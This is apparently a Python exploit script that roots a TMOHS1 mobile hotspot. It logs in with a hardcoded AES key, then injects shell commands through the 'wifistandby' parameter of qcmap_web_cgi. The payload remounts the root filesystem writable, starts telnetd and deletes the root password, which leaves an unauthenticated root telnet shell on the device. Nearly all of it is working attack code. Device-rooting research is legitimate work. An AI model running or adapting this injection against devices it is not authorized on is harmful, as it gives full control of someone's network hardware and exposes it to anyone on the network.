#!/usr/bin/env python
# -*- coding: utf-8 -*-
#-----------------------------------------------
#    Exploit script for TMOHS1 hotspot			
#												
#    Gives us a root shell over telnet			
#    and offers several utility functions		
#												
#    Copyright (c) 2022 natthawk				
#												
#    This code is licensed under the GNU		
#    General Public License, Version 3.			
#-----------------------------------------------

from cryptography.hazmat.primitives.ciphers import algorithms, modes, Cipher
from cryptography.hazmat.primitives import padding
from base64 import b64encode
import urllib.parse
import requests
import time
from getpass import getpass
from utils import TelnetConnection,chooseAction,chPwdFlag

# We have to get an authentication token for the exploit to work, provided by the
# qcmap_auth cgi. The login page AES128-ECB encrypts the weblogin
# password with this predefined [and incredibly insecure] key
# and sends it as a base64 string, so we define an encryptor and padder
# to convert it to the right format for authentication.

key = b'abcdefghijklmn12'
AES = Cipher(algorithms.AES(key), modes.ECB())
encryptor = AES.encryptor()
padder = padding.PKCS7(128).padder()


passwd = getpass('''Enter your weblogin password:''')

bPasswd = passwd.encode('utf-8')
packedPasswd = padder.update(bPasswd) + padder.finalize()     # add some bytes to make ECB cooperate
bCrypt = encryptor.update(packedPasswd) + encryptor.finalize()
crypt = b64encode(bCrypt).decode("utf-8")

payload = {
    'type': 'login',
    'pwd': crypt,
    'timeout': '600000',
    'user': 'admin'
}

# we manually URL encode the request with safe='=+' because the python requests
# module percent-encodes the '=' and '+' signs in the base64 'pwd' string,
# which confuses qcmap_auth

urlencodedPayload = urllib.parse.urlencode(payload, safe='=+')


print('Sending the authentication request. . .')
loginData = requests.post(
    'http://192.168.0.1/cgi-bin/qcmap_auth', data=urlencodedPayload)
time.sleep(1)
# make sure we authenticated successfully
if (loginData.status_code != 200) or (loginData.json()['result'] != '0'):
    print('Error: The hotspot rejected our request. Double check the password and try again.')
    quit()

token = loginData.json()['token']
print(f'Received authentication token from hotspot: {token}\n')

print('Exploiting qcmap_web_cgi.\n\nWaiting for socket. . .\n')
time.sleep(1)

# this function injects the payload into a malformed request, but we still provide a token
# because the cgi won't actually run its wifistandby update routine (our route of attack) otherwise
def sendCmd(payloadStr):
    # Not even bothering with urllib.parse.urlencode, since we have to include so many characters that
    # urlencode will get rid of in the name of "safety"
    payloadStr = f'10;$({payloadStr})'
    exploitPayload = f'page=savepowersaving&displaytimeout=undefined&wifistandby={payloadStr}&token={token}'
    return requests.post('http://192.168.0.1/cgi-bin/qcmap_web_cgi', data=exploitPayload)


time.sleep(1)
print(
    '''
Connection to device may reset. If you are running the exploit via WiFi,
ensure that your device reconnects to the hotspot's network.
This may take 20-30 seconds. . .'''
)
# This is the main payload. It remounts the root filesystem r/w so we can 
# edit /etc/passwd, enables telnet, and runs 'passwd -d root', which
# removes the password for root. We have to wait for the request to qcmap_web_cgi
# to resolve, and the connection may reset, which is why it takes about 20-30 seconds.

# the fun part
exploit = sendCmd('mount -o remount,rw /; telnetd; passwd -d root')

print(f'\nConnected! Socket says: {exploit.json()}\n')

print('Remounted root filesystem r/w. . .')
print('Removed root password. . .')
print('Enabled telnet. . .')
chPwdFlag = True # i.e. there is no root password set

# start telnet and prompt user for action, see details of implementation in utils.py
tn = TelnetConnection('192.168.0.1', 5)
chooseAction(tn)
